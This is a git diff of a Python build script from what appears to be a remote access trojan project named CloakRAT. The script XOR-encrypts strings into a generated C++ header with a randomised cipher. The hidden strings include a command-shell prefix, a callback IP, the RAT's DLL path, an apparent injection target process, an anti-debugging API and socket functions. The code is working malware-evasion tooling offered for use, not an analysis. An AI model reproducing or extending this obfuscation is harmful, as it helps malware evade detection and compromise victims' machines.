@@ -2,7 +2,6 @@ import secrets
 import os
 
 HEADER_NAME = 'encrypted_strings_autogen.h'
-SOURCE_NAME = 'encrypted_strings_autogen.cpp'
 DIR = os.path.dirname(os.path.realpath(__file__)) + '\\Shared'
 KEY_ENTROPY = 16 # bytes
 HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
@@ -11,13 +10,13 @@ HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
 
 # Add or modify strings here.
 strings_to_encrypt = {
-    # CloakRAT general strings
+    # General strings
     'str_ip': '127.0.0.1',
     'str_cmd': 'cmd.exe /C',
     'str_dllPath': 'C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll',
-    'str_socket': 'socket',
+    'str_procName': 'notepad.exe',
     
-    # function names
+    # Function names
     'str_NtSetInformationThread': 'NtSetInformationThread',
     'str_GetCurrentThread': 'GetCurrentThread',
     'str_Sleep': 'Sleep',
@@ -61,6 +60,7 @@ strings_to_encrypt = {
     'str_connect': 'connect',
     'str_htonl': 'htonl',
     'str_send': 'send',
+    'str_socket': 'socket',
     'str_recv': 'recv',
     'str_ntohl': 'ntohl',
     'str_closesocket': 'closesocket',
@@ -73,7 +73,7 @@ strings_to_encrypt = {
     'str_ws2_32': 'ws2_32.dll',
     'str_user32': 'user32.dll',
     
-    # Debug strings
+    # Debug
     'str_WSAGetLastError': 'WSAGetLastError',
 }
 
@@ -87,7 +87,7 @@ def get_random_op() -> str:
     return secrets.choice(['+', '-', '*'])
 
 def xor_encrypt(string_plaintext: str, key: list[int], cipher: str) -> list[int]:
-    # The highest bit in the first byte is preserved to indicate if runtime re-encryption has happened (see runtime_reencryption())
+    # The highest bit in the first byte is preserved to indicate if runtime re-encryption has happened (see runtime_reencryption() in string_encryption.cpp)
     encrypted_bytes = [secrets.randbelow(128)] # highest possible random value is 2^7
     data = string_plaintext.encode('utf-8') + b'\x00' # add the null terminator because this we treat the string as a C-style string 
 
@@ -97,16 +97,13 @@ def xor_encrypt(string_plaintext: str, key: list[int], cipher: str) -> list[int]
     return encrypted_bytes
     
 def to_c_struct(variable_name: str):
+    # return in the format: static EncryptedString var_name = { var_name, sizeof(var_name) };
     return f'static EncryptedString {variable_name} = {{\n    {variable_name}_data,\n    sizeof({variable_name}_data)\n}};'
 
 def to_c_array(variable_name: str, buffer: list[int]) -> str:
-    # return in the format: "unsigned char variable_name[] = { ...buffer };"
+    # return in the format: "static unsigned char variable_name[] = { ...buffer };"
     elems = ', '.join(str(b) for b in buffer)
     return f"static unsigned char {variable_name}[] = {{ {elems} }};"
-
-def to_extern_decl(variable_name: str) -> str:
-    # return in the format: "extern EncryptedString variable_name;"
-    return f"extern EncryptedString {variable_name};"
     
 
 def main():    
@@ -120,19 +117,6 @@ def main():
     # BE CAREFUL TO EDIT VARIABLE NAMES HERE, THIS IS GOING TO BE PROCESSED BY eval()
     byte_chiper = f"((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + key[i % len(key)] & ((i//2)>>3) * i {rand_op3} key[i % len(key)]) << (i % 5)) & 0x7F ^ {rand_xor_value})" # randomize the cipher each run
     
-    # Generate the Source file 
-    
-    
-    # with open(f'{DIR}/{SOURCE_NAME}', 'w') as source_file:
-    #     source_file.write(f'#include \"{HEADER_NAME}\"\n\n')
-        
-    #     for var_name, string in strings_to_encrypt.items():
-    #         encrypted_string_lst = xor_encrypt(string, key, byte_chiper)
-    #         encrypted_c_arr = to_c_array(f'{var_name}_data', encrypted_string_lst)
-    #         c_struct = to_c_struct(var_name)
-    #         source_file.write(encrypted_c_arr + '\n')  # Write the encrypted string array
-    #         source_file.write(c_struct + '\n\n')  # Write the encrypted string struct
-    
     # Generate the Header file
     with open(f'{DIR}/{HEADER_NAME}', 'w') as header_file:
         c_style_byte_cipher = f"(unsigned char)((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()] & ((i/2)>>3) * i {rand_op3} {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()]) << (i % 5)) & 0x7F ^ {rand_xor_value})"
@@ -144,13 +128,13 @@ def main():
         header_file.write(f'typedef struct EncryptedString {{\n    unsigned char* data;\n    size_t length;\n}} EncryptedString;\n\n')
         
         for var_name, string in strings_to_encrypt.items():
-            #extern_decl = to_extern_decl(var_name)
             encrypted_string_lst = xor_encrypt(string, key, byte_chiper)
             encrypted_c_arr = to_c_array(f'{var_name}_data', encrypted_string_lst)
             c_struct = to_c_struct(var_name)
             
-            header_file.write(encrypted_c_arr + '\n')
-            header_file.write(c_struct + '\n\n')
+            header_file.write(f'// "{string}"\n')  # Add the plaintext string as a comment for clarity
+            header_file.write(encrypted_c_arr + '\n')  # Example: static unsigned char str_kernel32_data[] = { ... };
+            header_file.write(c_struct + '\n\n')  # Example: static EncryptedString str_kernel32 = { str_kernel32_data, sizeof(str_kernel32_data) };
 
 if __name__ == '__main__':
         main()
